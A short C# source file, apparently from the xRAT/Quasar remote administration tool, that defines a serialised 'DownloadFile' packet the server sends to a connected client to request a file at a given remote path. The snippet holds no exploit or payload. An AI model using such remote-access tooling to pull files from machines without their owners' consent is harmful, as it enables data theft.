using ProtoBuf;

namespace xServer.Core.Packets.ServerPackets
{
    [ProtoContract]
    public class DownloadFile : IPacket
    {
        [ProtoMember(1)]
        public string RemotePath { get; set; }

        [ProtoMember(2)]
        public int ID { get; set; }

        public DownloadFile()
        {
        }

        public DownloadFile(string remotepath, int id)
        {
            this.RemotePath = remotepath;
            this.ID = id;
        }

        public void Execute(Client client)
        {
            client.Send<DownloadFile>(this);
        }
    }
}